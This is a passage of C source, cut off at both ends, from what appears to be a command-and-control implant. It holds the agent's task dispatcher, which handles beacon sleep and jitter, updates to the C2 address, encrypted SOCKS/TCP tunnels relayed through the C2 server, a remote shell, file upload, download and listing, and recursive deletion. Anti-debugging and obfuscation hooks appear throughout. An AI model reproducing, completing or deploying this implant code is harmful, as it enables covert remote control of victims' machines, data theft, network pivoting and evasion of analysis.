    if (host == NULL || out == NULL || out_size == 0 || port < 1 || port > 65535) {

        return -1;

    }



    if (inet_pton(AF_INET6, host, &ipv6_addr) == 1) {

        written = snprintf(out, out_size, "[%s]:%d", host, port);

    } else {

        written = snprintf(out, out_size, "%s:%d", host, port);

    }



    if (written <= 0 || (size_t)written >= out_size) {

        return -1;

    }

    return 0;

}



static int format_endpoint_for_log(const char* host, int port, char* out, size_t out_size) {

    if (build_connect_url(host, port, out, out_size) == 0) {
        return 0;
    }

    if (out == NULL || out_size == 0) {
        return -1;
    }

    if (host == NULL) {
        return -1;
    }

    if (snprintf(out, out_size, "%s:%d", host, port) <= 0 || strlen(out) >= out_size) {
        return -1;
    }

    return 0;
}

static int parse_address_host_port(const char* address, char* host, size_t host_size, int* port) {

    char normalized[512];

    const char* addr = NULL;

    size_t addr_len = 0;

    const char* port_start = NULL;

    size_t host_len = 0;

    long parsed_port = 0;

    char* end_ptr = NULL;



    if (!address || !host || !port || host_size == 0 || host_size > sizeof(normalized)) {

        return -1;

    }



    while (*address != '\0' && isspace((unsigned char)*address)) {

        address++;

    }

    addr_len = strlen(address);

    while (addr_len > 0 && isspace((unsigned char)address[addr_len - 1])) {

        addr_len--;

    }

    if (addr_len == 0 || addr_len >= sizeof(normalized)) {

        return -1;

    }



    memcpy(normalized, address, addr_len);

    normalized[addr_len] = '\0';

    addr = normalized;



    if (addr[0] == '[') {

        const char* close_bracket = strchr(addr, ']');

        if (!close_bracket || close_bracket[1] != ':') {

            return -1;

        }

        port_start = close_bracket + 2;

        host_len = (size_t)(close_bracket - (addr + 1));

        if (host_len == 0 || host_len >= host_size) {

            return -1;

        }

        memcpy(host, addr + 1, host_len);

        host[host_len] = '\0';

    } else {

        const char* colon = strrchr(addr, ':');

        if (!colon) {

            return -1;

        }

        port_start = colon + 1;

        host_len = (size_t)(colon - addr);

        if (host_len == 0 || host_len >= host_size) {

            return -1;

        }

        memcpy(host, addr, host_len);

        host[host_len] = '\0';

    }



    while (*port_start != '\0' && isspace((unsigned char)*port_start)) {

        port_start++;

    }

    parsed_port = strtol(port_start, &end_ptr, 10);

    if (end_ptr == port_start) {

        return -1;

    }

    while (*end_ptr != '\0' && isspace((unsigned char)*end_ptr)) {

        end_ptr++;

    }

    if (*end_ptr != '\0' || parsed_port < 1 || parsed_port > 65535) {

        return -1;

    }



    *port = (int)parsed_port;

    return 0;

}



static int connect_tcp_endpoint(const char* host, int port, int timeout_ms, int* out_err, int* out_timeout) {

    struct addrinfo hints;

    struct addrinfo* result = NULL;

    char port_str[16];

    int fd = -1;

    int saved_err = ECONNREFUSED;

    int timeout_flag = 0;



    if (out_err) *out_err = 0;

    if (out_timeout) *out_timeout = 0;



    memset(&hints, 0, sizeof(hints));

    hints.ai_family = AF_UNSPEC;

    hints.ai_socktype = SOCK_STREAM;



    snprintf(port_str, sizeof(port_str), "%d", port);

    if (getaddrinfo(host, port_str, &hints, &result) != 0) {

        if (out_err) *out_err = EHOSTUNREACH;

        return -1;

    }



    for (struct addrinfo* rp = result; rp != NULL; rp = rp->ai_next) {

        int current_fd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);

        if (current_fd < 0) {

            continue;

        }



        int flags = fcntl(current_fd, F_GETFL, 0);

        if (flags >= 0) {

            fcntl(current_fd, F_SETFL, flags | O_NONBLOCK);

        }



        int rc = connect(current_fd, rp->ai_addr, rp->ai_addrlen);

        if (rc == 0) {

            if (flags >= 0) {

                fcntl(current_fd, F_SETFL, flags);

            }

            fd = current_fd;

            break;

        }



        if (errno == EINPROGRESS) {

            fd_set wfds;

            struct timeval tv;

            FD_ZERO(&wfds);

            FD_SET(current_fd, &wfds);

            tv.tv_sec = timeout_ms / 1000;

            tv.tv_usec = (timeout_ms % 1000) * 1000;



            rc = select(current_fd + 1, NULL, &wfds, NULL, &tv);

            if (rc > 0 && FD_ISSET(current_fd, &wfds)) {

                int so_error = 0;

                socklen_t so_len = sizeof(so_error);

                if (getsockopt(current_fd, SOL_SOCKET, SO_ERROR, &so_error, &so_len) == 0 && so_error == 0) {

                    if (flags >= 0) {

                        fcntl(current_fd, F_SETFL, flags);

                    }

                    fd = current_fd;

                    break;

                }

                saved_err = so_error != 0 ? so_error : ECONNREFUSED;

            } else if (rc == 0) {

                timeout_flag = 1;

                saved_err = ETIMEDOUT;

            } else {

                saved_err = errno;

            }

        } else {

            saved_err = errno;

        }



        close(current_fd);

    }



    freeaddrinfo(result);



    if (out_err) *out_err = saved_err;

    if (out_timeout) *out_timeout = timeout_flag;

    return fd;

}



static int recv_banner_fd(int fd) {

    unsigned char probe_buf[256];

    for (;;) {

        ssize_t peek_len = recv(fd, probe_buf, sizeof(probe_buf), MSG_PEEK);

        if (peek_len < 0) {

            if (errno == EINTR) {

                continue;

            }

            return -1;

        }

        if (peek_len == 0) {

            return -1;

        }

        size_t banner_len = 0;
        banner_probe_result_t probe = probe_optional_banner(probe_buf, (size_t) peek_len,
            BANNER_PROBE_PACKET, &banner_len);

        if (probe == BANNER_PROBE_NO_BANNER) {

            return 0;

        }

        if (probe == BANNER_PROBE_CONSUME) {

            return discard_socket_bytes(fd, banner_len);

        }

        if (probe == BANNER_PROBE_INVALID) {

            return -1;

        }

        {

            fd_set rfds;
            int rc;

            FD_ZERO(&rfds);
            FD_SET(fd, &rfds);
            rc = select(fd + 1, &rfds, NULL, NULL, NULL);
            if (rc < 0) {

                if (errno == EINTR) {

                    continue;

                }

                return -1;

            }

        }

    }

}

static int send_update_c2_ack(struct mg_connection* c, const update_c2_command_t* update_cmd) {

    uint8_t ack_buf[1024];
    size_t ack_len = 0;
    mpack_writer_t writer;

    if (c == NULL || update_cmd == NULL) {

        return -1;

    }

    mpack_writer_init(&writer, (char*) ack_buf, sizeof(ack_buf));
    mpack_start_map(&writer, 3);
    mpack_write_cstr(&writer, "ok");
    mpack_write_bool(&writer, true);
    mpack_write_cstr(&writer, "immediate");
    mpack_write_bool(&writer, update_cmd->immediate ? true : false);
    mpack_write_cstr(&writer, "addresses");
    mpack_start_array(&writer, (uint32_t) update_cmd->address_count);
    for (int i = 0; i < update_cmd->address_count; i++) {
        mpack_write_cstr(&writer, update_cmd->addresses[i]);
    }
    mpack_finish_array(&writer);
    mpack_finish_map(&writer);

    if (mpack_writer_destroy(&writer) != mpack_ok) {

        LOG_ERROR("Failed to pack update_c2 ack");
        return -1;

    }

    ack_len = mpack_writer_buffer_used(&writer);
    return send_command_response(c, CMD_CODE_UPDATE_C2, update_cmd->task_id, ack_buf, ack_len);

}

static int send_command_error_response(struct mg_connection* c, uint32_t task_id, const char* message) {

    uint8_t err_buf[512];
    size_t err_len = 0;
    mpack_writer_t writer;

    if (c == NULL || message == NULL) {

        return -1;

    }

    mpack_writer_init(&writer, (char*) err_buf, sizeof(err_buf));
    mpack_start_map(&writer, 1);
    mpack_write_cstr(&writer, "error");
    mpack_write_cstr(&writer, message);
    mpack_finish_map(&writer);

    if (mpack_writer_destroy(&writer) != mpack_ok) {

        LOG_ERROR("Failed to pack command error response");
        return -1;

    }

    err_len = mpack_writer_buffer_used(&writer);
    return send_command_response(c, 0, task_id, err_buf, err_len);

}



static int send_tunnel_start_pack_fd(int relay_fd, int channel_id, int alive, uint8_t reason,

    const unsigned char* tun_key, const unsigned char* tun_iv) {

    uint8_t pack_buf[512];

    uint8_t msg_buf[768];

    mpack_writer_t writer;

    int pack_len;

    int msg_len;



    mpack_writer_init(&writer, (char*)pack_buf, sizeof(pack_buf));

    mpack_start_map(&writer, 7);

    mpack_write_cstr(&writer, "id");

    mpack_write_u32(&writer, get_agent_id());

    mpack_write_cstr(&writer, "type");

    mpack_write_u32(&writer, 0x904e5493);

    mpack_write_cstr(&writer, "channel_id");

    mpack_write_i32(&writer, channel_id);

    mpack_write_cstr(&writer, "key");

    mpack_write_bin(&writer, (const char*)tun_key, 32);

    mpack_write_cstr(&writer, "iv");

    mpack_write_bin(&writer, (const char*)tun_iv, 16);

    mpack_write_cstr(&writer, "alive");

    mpack_write_bool(&writer, alive ? true : false);

    mpack_write_cstr(&writer, "reason");

    mpack_write_u8(&writer, reason);

    mpack_finish_map(&writer);

    if (mpack_writer_destroy(&writer) != mpack_ok) {

        return -1;

    }

    pack_len = (int)mpack_writer_buffer_used(&writer);



    mpack_writer_init(&writer, (char*)msg_buf, sizeof(msg_buf));

    mpack_start_map(&writer, 2);

    mpack_write_cstr(&writer, "id");

    mpack_write_i32(&writer, JOB_TUNNEL);

    mpack_write_cstr(&writer, "data");

    mpack_write_bin(&writer, (const char*)pack_buf, pack_len);

    mpack_finish_map(&writer);

    if (mpack_writer_destroy(&writer) != mpack_ok) {

        return -1;

    }

    msg_len = (int)mpack_writer_buffer_used(&writer);



    return send_packet_fd(relay_fd, msg_buf, (size_t)msg_len, GLOBAL_KEY);

}



static int connect_c2_relay_fd(void) {

    char c2_host[256];

    char resolved_host[INET6_ADDRSTRLEN] = {0};

    char relay_url[320] = {0};

    int c2_port;

    int err_code = 0;

    int timeout_flag = 0;



    get_current_c2_address(c2_host, sizeof(c2_host), &c2_port);



    if (prepare_connect_target(c2_host, c2_port,

        resolved_host, sizeof(resolved_host),

        relay_url, sizeof(relay_url), NULL) != 0) {

        LOG_ERROR("Tunnel relay resolve failed: %s", relay_url[0] != '\0' ? relay_url : c2_host);

        return -1;

    }



    int relay_fd = connect_tcp_endpoint(resolved_host, c2_port, 3000, &err_code, &timeout_flag);

    if (relay_fd < 0) {

        LOG_ERROR("Tunnel relay connect failed: %s err=%d timeout=%d", relay_url[0] != '\0' ? relay_url : c2_host, err_code, timeout_flag);

        return -1;

    }



    if (recv_banner_fd(relay_fd) != 0) {

        LOG_ERROR("Tunnel relay banner read failed");

        close(relay_fd);

        return -1;

    }

    LOG_INFO("Tunnel relay connected: fd=%d target=%s resolved=%s", relay_fd, relay_url[0] != '\0' ? relay_url : c2_host, resolved_host);

    return relay_fd;

}



static THREAD_FUNC tunnel_session_thread(void* arg) {

    tunnel_session_t* session = (tunnel_session_t*)arg;

    unsigned char tun_key[32];

    unsigned char tun_iv[16];

    unsigned char iv_enc[16];

    unsigned char iv_dec[16];

    struct AES_ctx enc_ctx;

    struct AES_ctx dec_ctx;
    uint64_t enc_offset = 0;
    uint64_t dec_offset = 0;

    uint8_t io_buf[32768];

    int active = 1;

    uint8_t reason = 0;

    int connect_err = 0;

    int timeout_flag = 0;

    int relay_logged = 0;

    int target_logged = 0;

    char host[256];

    int port = 0;

    char close_reason[128] = "loop ended";



    session->relay_fd = -1;

    session->target_fd = -1;



    if (strcasecmp(session->proto, "tcp") != 0 && strcasecmp(session->proto, "socks5") != 0) {

        LOG_WARN("Tunnel %d unsupported proto '%s' for address '%s'", session->channel_id, session->proto, session->address);

        active = 0;

        reason = (strcasecmp(session->proto, "udp") == 0) ? 7 : 5;

    } else if (parse_address_host_port(session->address, host, sizeof(host), &port) != 0) {

        active = 0;

        reason = 5;

    } else {

        int target_fd = connect_tcp_endpoint(host, port, 3000, &connect_err, &timeout_flag);

        if (target_fd < 0) {

            active = 0;

            reason = (uint8_t)map_connect_error_reason(connect_err, timeout_flag);

        } else {

            session->target_fd = target_fd;

        }

    }



    session->relay_fd = connect_c2_relay_fd();

    if (session->relay_fd < 0) {

        tunnel_session_destroy(session);

#ifdef _WIN32

        return 0;

#else

        return NULL;

#endif

    }



    generate_random_bytes(tun_key, sizeof(tun_key));

    generate_random_bytes(tun_iv, sizeof(tun_iv));



    if (send_tunnel_start_pack_fd(session->relay_fd, session->channel_id, active, reason, tun_key, tun_iv) != 0) {

        LOG_ERROR("Tunnel %d failed to send start pack", session->channel_id);

        tunnel_session_destroy(session);

#ifdef _WIN32

        return 0;

#else

        return NULL;

#endif

    }



    if (!active) {

        LOG_WARN("Tunnel %d target connect failed, reason=%u", session->channel_id, reason);

        tunnel_session_destroy(session);

#ifdef _WIN32

        return 0;

#else

        return NULL;

#endif

    }



    memcpy(iv_enc, tun_iv, sizeof(iv_enc));

    memcpy(iv_dec, tun_iv, sizeof(iv_dec));

    #if PAYLOAD_CIPHER_MODE == PAYLOAD_CIPHER_RC5
    (void)iv_enc;
    (void)iv_dec;
    #else
    AES_init_ctx_iv(&enc_ctx, tun_key, iv_enc);

    AES_init_ctx_iv(&dec_ctx, tun_key, iv_dec);
    #endif



    LOG_INFO("Tunnel %d established (%s)", session->channel_id, session->address);
    LOG_INFO("Tunnel %d relay session started: relay_fd=%d target_fd=%d proto=%s", session->channel_id, session->relay_fd, session->target_fd, session->proto);



    while (session->running && !g_shutdown) {

#ifdef _WIN32

        fd_set rfds;

        int max_fd = -1;

        struct timeval tv;

        int relay_ready = 0;

        int target_ready = 0;



        FD_ZERO(&rfds);

        if (session->relay_fd >= 0) {

            FD_SET(session->relay_fd, &rfds);

            if (session->relay_fd > max_fd) max_fd = session->relay_fd;

        }

        if (!session->paused && session->target_fd >= 0) {

            FD_SET(session->target_fd, &rfds);

            if (session->target_fd > max_fd) max_fd = session->target_fd;

        }

        if (max_fd < 0) {

            break;

        }

        tv.tv_sec = 0;

        tv.tv_usec = 200000;

        int ready = select(max_fd + 1, &rfds, NULL, NULL, &tv);

        if (ready < 0) {

            if (errno == EINTR) {

                continue;

            }

            break;

        }

        if (ready == 0) {

            continue;

        }

        relay_ready = (session->relay_fd >= 0 && FD_ISSET(session->relay_fd, &rfds));

        target_ready = (!session->paused && session->target_fd >= 0 && FD_ISSET(session->target_fd, &rfds));

#else

        struct pollfd fds[2];

        nfds_t nfds = 0;

        int relay_idx = -1;

        int target_idx = -1;



        if (session->relay_fd >= 0) {

            relay_idx = (int)nfds;

            fds[nfds].fd = session->relay_fd;

            fds[nfds].events = POLLIN;

            fds[nfds].revents = 0;

            nfds++;

        }

        if (!session->paused && session->target_fd >= 0) {

            target_idx = (int)nfds;

            fds[nfds].fd = session->target_fd;

            fds[nfds].events = POLLIN;

            fds[nfds].revents = 0;

            nfds++;

        }



        if (nfds == 0) {

            break;

        }



        int ready = poll(fds, nfds, 200);

        if (ready < 0) {

            if (errno == EINTR) {

                continue;

            }

            break;

        }

        if (ready == 0) {

            continue;

        }



        if (relay_idx >= 0 && (fds[relay_idx].revents & (POLLERR | POLLHUP | POLLNVAL))) {

            snprintf(close_reason, sizeof(close_reason), "relay poll event=0x%x", fds[relay_idx].revents);

            break;

        }

        if (target_idx >= 0 && (fds[target_idx].revents & (POLLERR | POLLHUP | POLLNVAL))) {

            snprintf(close_reason, sizeof(close_reason), "target poll event=0x%x", fds[target_idx].revents);

            break;

        }

        int relay_ready = (relay_idx >= 0 && (fds[relay_idx].revents & POLLIN));

        int target_ready = (target_idx >= 0 && (fds[target_idx].revents & POLLIN));

#endif



        if (relay_ready) {

            ssize_t n = recv(session->relay_fd, io_buf, sizeof(io_buf), 0);

            if (n <= 0) {

                snprintf(close_reason, sizeof(close_reason), "relay recv=%zd errno=%d", n, errno);

                break;

            }

            #if PAYLOAD_CIPHER_MODE == PAYLOAD_CIPHER_RC5
            if (rc5_stream_xcrypt(tun_key, tun_iv, &dec_offset, io_buf, (size_t)n) != 0) {
                snprintf(close_reason, sizeof(close_reason), "relay decrypt failed");
                break;
            }
            #else
            AES_CTR_xcrypt_buffer(&dec_ctx, io_buf, (uint32_t)n);
            #endif

            if (!relay_logged) {

                char preview[64];

                format_data_preview(io_buf, (size_t)n, preview, sizeof(preview));

                LOG_INFO("Tunnel %d first relay->target bytes=%zd preview=%s", session->channel_id, n, preview);

                relay_logged = 1;

            }

            if (send_all_fd(session->target_fd, io_buf, (size_t)n) != 0) {

                snprintf(close_reason, sizeof(close_reason), "target send failed errno=%d", errno);

                break;

            }

        }



        if (target_ready) {

            ssize_t n = recv(session->target_fd, io_buf, sizeof(io_buf), 0);

            if (n <= 0) {

                snprintf(close_reason, sizeof(close_reason), "target recv=%zd errno=%d", n, errno);

                break;

            }

            if (!target_logged) {

                char preview[64];

                format_data_preview(io_buf, (size_t)n, preview, sizeof(preview));

                LOG_INFO("Tunnel %d first target->relay bytes=%zd preview=%s", session->channel_id, n, preview);

                target_logged = 1;

            }

            #if PAYLOAD_CIPHER_MODE == PAYLOAD_CIPHER_RC5
            if (rc5_stream_xcrypt(tun_key, tun_iv, &enc_offset, io_buf, (size_t)n) != 0) {
                snprintf(close_reason, sizeof(close_reason), "target encrypt failed");
                break;
            }
            #else
            AES_CTR_xcrypt_buffer(&enc_ctx, io_buf, (uint32_t)n);
            #endif

            if (send_all_fd(session->relay_fd, io_buf, (size_t)n) != 0) {

                snprintf(close_reason, sizeof(close_reason), "relay send failed errno=%d", errno);

                break;

            }

        }

    }



    LOG_INFO("Tunnel %d closed: %s", session->channel_id, close_reason);

    tunnel_session_destroy(session);



#ifdef _WIN32

    return 0;

#else

    return NULL;

#endif

}



static void handle_tunnel_start_command(const tunnel_start_command_t* cmd) {
    anti_debug_check_sensitive();

    const char* proto_use = NULL;



    if (!cmd || !cmd->header.valid) {

        return;

    }

    if (cmd->channel_id <= 0 || cmd->address[0] == '\0') {

        LOG_ERROR("Invalid tunnel start params: channel_id=%d, proto=%s, address=%s",
            cmd ? cmd->channel_id : -1,
            cmd ? cmd->proto : "<null>",
            cmd ? cmd->address : "<null>");

        return;

    }

    if (strcasecmp(cmd->proto, "tcp") == 0 || strcasecmp(cmd->proto, "socks5") == 0) {

        proto_use = "tcp";

    } else {

        LOG_ERROR("Tunnel %d unsupported proto '%s' for address '%s'", cmd->channel_id, cmd->proto, cmd->address);

        return;

    }



    pthread_mutex_lock(&g_tunnel_sessions_mutex);

    tunnel_session_t* exists = find_tunnel_session_nolock(cmd->channel_id);

    if (exists != NULL) {

        exists->running = 0;

        exists->paused = 0;

        tunnel_session_request_stop(exists);

        pthread_mutex_unlock(&g_tunnel_sessions_mutex);

        LOG_WARN("Tunnel %d already exists, requested stop for old session", cmd->channel_id);

        return;

    }



    tunnel_session_t* session = (tunnel_session_t*)calloc(1, sizeof(tunnel_session_t));

    if (!session) {

        pthread_mutex_unlock(&g_tunnel_sessions_mutex);

        LOG_ERROR("Failed to allocate tunnel session");

        return;

    }



    session->channel_id = cmd->channel_id;

    session->running = 1;

    session->paused = 0;

    session->exited = 0;

    session->relay_fd = -1;

    session->target_fd = -1;

    session->realtime_held = 0;

    safe_strncpy(session->proto, proto_use, sizeof(session->proto));

    safe_strncpy(session->address, cmd->address, sizeof(session->address));



    HASH_ADD_INT(g_tunnel_sessions, channel_id, session);

    pthread_mutex_unlock(&g_tunnel_sessions_mutex);



    beacon_hold_enter("tunnel");

    session->realtime_held = 1;

    if (!CREATE_THREAD(session->thread, tunnel_session_thread, session)) {

        LOG_ERROR("Failed to create tunnel thread");

        tunnel_session_destroy(session);

        return;

    }

#ifndef _WIN32

    pthread_detach(session->thread);

#endif



    LOG_INFO("Tunnel %d start requested: %s://%s", cmd->channel_id, cmd->proto, cmd->address);

}



static void handle_tunnel_stop_command(const tunnel_control_command_t* cmd) {

    if (!cmd || !cmd->header.valid) {

        return;

    }



    pthread_mutex_lock(&g_tunnel_sessions_mutex);

    tunnel_session_t* session = find_tunnel_session_nolock(cmd->channel_id);

    if (session) {

        session->running = 0;

        session->paused = 0;

        tunnel_session_request_stop(session);

    }

    pthread_mutex_unlock(&g_tunnel_sessions_mutex);



    LOG_INFO("Tunnel %d stop requested", cmd->channel_id);

}



static void handle_tunnel_pause_command(const tunnel_control_command_t* cmd) {

    if (!cmd || !cmd->header.valid) {

        return;

    }



    pthread_mutex_lock(&g_tunnel_sessions_mutex);

    tunnel_session_t* session = find_tunnel_session_nolock(cmd->channel_id);

    if (session) {

        session->paused = 1;

    }

    pthread_mutex_unlock(&g_tunnel_sessions_mutex);



    LOG_INFO("Tunnel %d paused", cmd->channel_id);

}



static void handle_tunnel_resume_command(const tunnel_control_command_t* cmd) {

    if (!cmd || !cmd->header.valid) {

        return;

    }



    pthread_mutex_lock(&g_tunnel_sessions_mutex);

    tunnel_session_t* session = find_tunnel_session_nolock(cmd->channel_id);

    if (session) {

        session->paused = 0;

    }

    pthread_mutex_unlock(&g_tunnel_sessions_mutex);



    LOG_INFO("Tunnel %d resumed", cmd->channel_id);

}





void handle_task(struct mg_connection* c, const parsed_command_t* cmd) {

    if (!cmd) {

        LOG_ERROR("Invalid command");

        return;

    }



    switch (cmd->type) {

    case CMD_CODE_EXIT:  // code = 4

        LOG_INFO("Received exit command, initiating graceful shutdown...");

        g_shutdown = 1;

        break;



    case CMD_CODE_SLEEP:  // code = 21
    {
        int sleep_reconnect_requested = 0;

        if (cmd->data.sleep.header.valid) {

            if (cmd->data.sleep.interval == 0) {

                g_beacon_interval_ms = 0;
                g_beacon_sleep_enabled = 0;
                g_main_sleep_reconnect = 0;
                pthread_mutex_lock(&g_main_state_mutex);
                g_main_online_deadline_ms = 0;
                pthread_mutex_unlock(&g_main_state_mutex);

                LOG_INFO("Sleep interval updated: 0 (persistent long connection mode)");

            } else if (cmd->data.sleep.interval >= 1) {

                g_beacon_interval_ms = cmd->data.sleep.interval * 1000;

                g_reconnect_base_delay = g_beacon_interval_ms;
                g_beacon_sleep_enabled = 1;
                pthread_mutex_lock(&g_main_state_mutex);
                if (g_main_connected_at_ms != 0) {
                    g_main_online_deadline_ms = g_main_connected_at_ms + (uint64_t) BEACON_ONLINE_WINDOW_MS;
                }
                pthread_mutex_unlock(&g_main_state_mutex);
                sleep_reconnect_requested = 1;

                LOG_INFO("Sleep interval updated: %d seconds (%d ms)",

                    cmd->data.sleep.interval, g_beacon_interval_ms);

            } else {

                LOG_WARN("Invalid sleep interval %d, expected 0 or >= 1", cmd->data.sleep.interval);

            }

            if (cmd->data.sleep.jitter >= 0 && cmd->data.sleep.jitter <= 100) {

                g_beacon_jitter_pct = cmd->data.sleep.jitter;

                g_reconnect_jitter_pct = cmd->data.sleep.jitter;

                LOG_INFO("Jitter updated: %d%%", cmd->data.sleep.jitter);

            }

            if (send_sleep_ack(c, &cmd->data.sleep) != 0) {

                LOG_WARN("Failed to send sleep ack (task_id=0x%08x)", cmd->data.sleep.task_id);

            } else if (sleep_reconnect_requested) {

                /*
                 * Sleep is a beacon-mode command. Flush the ACK first, then
                 * close the control channel so the outer loop performs the
                 * configured sleep+jitter delay before reconnecting.
                 */
                g_main_sleep_reconnect = 1;
                g_main_conn_intentional_close = 1;
                if (c != NULL) {
                    c->is_draining = 1;
                }

            }

        }

        break;
    }



    case CMD_CODE_UPDATE_C2:

        if (cmd->data.update_c2.header.valid) {

            const char* updated_addrs[RUNTIME_C2_MAX_ADDRS];

            for (int i = 0; i < cmd->data.update_c2.address_count; i++) {
                updated_addrs[i] = cmd->data.update_c2.addresses[i];
            }

            if (update_c2_address_list(updated_addrs, cmd->data.update_c2.address_count) != 0) {

                LOG_WARN("Failed to apply callback address update");
                (void) send_command_error_response(c, cmd->data.update_c2.task_id, "failed to update callback addresses");
                break;

            }

            if (send_update_c2_ack(c, &cmd->data.update_c2) != 0) {

                LOG_WARN("Failed to send update_c2 ack (task_id=0x%08x)", cmd->data.update_c2.task_id);

            } else if (cmd->data.update_c2.immediate) {

                g_main_force_reconnect = 1;

            }

        }

        break;



    case CMD_CODE_TUNNEL_START:

        if (cmd->data.tunnel_start.header.valid) {

            handle_tunnel_start_command(&cmd->data.tunnel_start);

            if (send_tunnel_control_ack(c, CMD_CODE_TUNNEL_START, cmd->data.tunnel_start.task_id) != 0) {

                LOG_WARN("Failed to send tunnel start ack (task_id=0x%08x)", cmd->data.tunnel_start.task_id);

            }

        }

        break;



    case CMD_CODE_TUNNEL_STOP:

        if (cmd->data.tunnel_control.header.valid) {

            handle_tunnel_stop_command(&cmd->data.tunnel_control);

            if (send_tunnel_control_ack(c, CMD_CODE_TUNNEL_STOP, cmd->data.tunnel_control.task_id) != 0) {

                LOG_WARN("Failed to send tunnel stop ack (task_id=0x%08x)", cmd->data.tunnel_control.task_id);

            }

        }

        break;



    case CMD_CODE_TUNNEL_PAUSE:

        if (cmd->data.tunnel_control.header.valid) {

            handle_tunnel_pause_command(&cmd->data.tunnel_control);

            if (send_tunnel_control_ack(c, CMD_CODE_TUNNEL_PAUSE, cmd->data.tunnel_control.task_id) != 0) {

                LOG_WARN("Failed to send tunnel pause ack (task_id=0x%08x)", cmd->data.tunnel_control.task_id);

            }

        }

        break;



    case CMD_CODE_TUNNEL_RESUME:

        if (cmd->data.tunnel_control.header.valid) {

            handle_tunnel_resume_command(&cmd->data.tunnel_control);

            if (send_tunnel_control_ack(c, CMD_CODE_TUNNEL_RESUME, cmd->data.tunnel_control.task_id) != 0) {

                LOG_WARN("Failed to send tunnel resume ack (task_id=0x%08x)", cmd->data.tunnel_control.task_id);

            }

        }

        break;



    case CMD_CODE_FILE_LISTDIR: {  // 12

        if (cmd->data.file_listdir.header.valid) {

            LOG_INFO("Executing file listdir command");



            response_listdir_t resp;

            memset(&resp, 0, sizeof(resp));





            if (execute_file_listdir(&cmd->data.file_listdir, &resp) == 0) {

                uint8_t* resp_buf = NULL;

                size_t resp_len = 0;





                if (pack_file_listdir_response(&resp, &resp_buf, &resp_len) == 0) {

                    LOG_INFO("Sending listdir response (%zu bytes)", resp_len);





                    send_command_response(c,

                        CMD_CODE_FILE_LISTDIR,

                        cmd->data.file_listdir.task_id,

                        resp_buf,

                        resp_len);



                    free(resp_buf);

                }

                else {

                    LOG_ERROR("Failed to pack listdir response");

                }





                free_listdir_response(&resp);

            }

            else {

                LOG_ERROR("Failed to execute listdir");





                response_listdir_t err_resp;

                memset(&err_resp, 0, sizeof(err_resp));

                err_resp.task_id = cmd->data.file_listdir.task_id;

                err_resp.command_code = CMD_CODE_FILE_LISTDIR;

                err_resp.result = 0;

                safe_strncpy(err_resp.path, cmd->data.file_listdir.path, sizeof(err_resp.path));

                snprintf(err_resp.status, sizeof(err_resp.status), "Failed to list directory");



                uint8_t* err_buf = NULL;

                size_t err_len = 0;



                if (pack_file_listdir_response(&err_resp, &err_buf, &err_len) == 0) {

                    send_command_response(c,

                        CMD_CODE_FILE_LISTDIR,

                        cmd->data.file_listdir.task_id,

                        err_buf,

                        err_len);

                    free(err_buf);

                }

            }

        }

        break;

    }

    case CMD_CODE_SHELL:

        if (cmd->data.shell.header.valid) {

            handle_terminal_start(c, &cmd->data.shell);

        }

        break;

    case CMD_CODE_TERMINAL_STOP:

        LOG_WARN("Terminal stop command");



        if (cmd->data.shell.header.valid) {

            //send_terminal_stop_ack_simple(sock, 36, cmd->data.shell.term_id);

            handle_terminal_stop(c, cmd->data.shell.task_id, cmd->data.shell.term_id);

        }





        break;

    case CMD_CODE_FILE_UPLOAD:

        if (cmd->data.file_upload.header.valid) {

            handle_file_upload_command(c, &cmd->data.file_upload);

        }

        break;

    case CMD_CODE_FILE_DOWNLOAD:  // 5

        if (cmd->data.file_download.header.valid) {



            handle_download_start_task(c, cmd->data.file_download.task_id);

            handle_file_download_command(c, &cmd->data.file_download);

        }

        break;

    case CMD_CODE_FILE_REMOVE:

        if (cmd->data.file_remove.header.valid)

        {

            LOG_INFO("Removed: %s\n", cmd->data.file_remove.path);





            if (remove_recursive(cmd->data.file_remove.path) == 0) {

                LOG_INFO("Removed: %s", cmd->data.file_remove.path);

            }

            else {

                LOG_ERROR("Failed to remove: %s", cmd->data.file_remove.path);

            }



            handle_file_remove_ack(c, cmd->data.file_remove.task_id);

        }

        break;

    default:

        LOG_WARN("Unhandled command type: %u", cmd->type);

        break;

    }

}



static void process_data(struct mg_connection* c, const unsigned char* buf, int len) {
    OBF_SENSITIVE_ENTER(0x3103u);

    time_t now;

    int msg_type;

    LOG_INFO("Processing %d bytes of data", len);

    main_activity_touch();



    time(&now);

    atomic_store64_compat(&g_state.last_heartbeat_recv, (long long)now);



    msg_type = parse_message_type(buf, len);



    LOG_INFO("Message type: %d", msg_type);



    switch (msg_type) {

    case MSG_TYPE_INIT:

    case MSG_TYPE_TASK:

    {

        const char* msg_name = (msg_type == MSG_TYPE_INIT) ? "INIT" : "TASK";

        LOG_INFO("Received %s response", msg_name);



        mpack_tree_t tree;

        mpack_tree_init_data(&tree, (const char*)buf, len);

        mpack_tree_parse(&tree);



        if (mpack_tree_error(&tree) != mpack_ok) {

            LOG_ERROR("Failed to parse %s envelope: %s", msg_name, mpack_error_to_string(mpack_tree_error(&tree)));

            mpack_tree_destroy(&tree);

            break;

        }



        mpack_node_t root = mpack_tree_root(&tree);

        mpack_node_t object_node = mpack_node_map_cstr_optional(root, "object");

        if (mpack_node_type(object_node) != mpack_type_array) {

            LOG_DEBUG("%s has no object array", msg_name);

            mpack_tree_destroy(&tree);

            break;

        }



        size_t arr_len = mpack_node_array_length(object_node);

        if (arr_len == 0) {

            LOG_DEBUG("%s object array is empty", msg_name);

            mpack_tree_destroy(&tree);

            break;

        }



        LOG_INFO("%s contains %zu embedded command(s)", msg_name, arr_len);



        for (size_t i = 0; i < arr_len; ++i) {

            mpack_node_t bin_node = mpack_node_array_at(object_node, i);

            if (mpack_node_type(bin_node) != mpack_type_bin) {

                LOG_WARN("Skipping non-binary object[%zu]", i);

                continue;

            }



            size_t bin_size = mpack_node_bin_size(bin_node);

            const char* bin_data = mpack_node_bin_data(bin_node);



            // Wrap one command back into a standard message envelope so existing parser can be reused.

            char* one_cmd_msg = NULL;

            size_t one_cmd_msg_len = 0;

            mpack_writer_t writer;

            mpack_writer_init_growable(&writer, &one_cmd_msg, &one_cmd_msg_len);



            mpack_start_map(&writer, 2);

            mpack_write_cstr(&writer, "type");

            mpack_write_i32(&writer, 1);

            mpack_write_cstr(&writer, "object");

            mpack_start_array(&writer, 1);

            mpack_write_bin(&writer, bin_data, bin_size);

            mpack_finish_array(&writer);

            mpack_finish_map(&writer);



            if (mpack_writer_destroy(&writer) != mpack_ok) {

